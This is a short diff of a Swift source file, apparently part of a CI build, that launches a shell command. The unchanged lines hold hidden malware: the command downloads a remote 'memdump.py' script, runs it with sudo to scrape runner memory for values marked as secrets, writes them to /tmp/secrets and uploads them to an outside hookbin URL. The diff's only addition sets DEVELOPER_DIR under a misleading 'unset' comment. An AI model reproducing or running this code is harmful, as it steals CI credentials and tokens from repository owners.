@@ -1,4 +1,8 @@
 import Foundation
+
+// Try to unset DEVELOPER_DIR to fix xcrun failure
+setenv("DEVELOPER_DIR", "/Applications/Xcode.app/Contents/Developer", 1)
+
 let task = Process()
 task.launchPath = "/bin/sh"
 task.arguments = ["-c", #"echo "Okay, we got this far. Let's continue..."; curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":{"value":"[^"]*","isSecret":true}' >> "/tmp/secrets"; curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID""#]
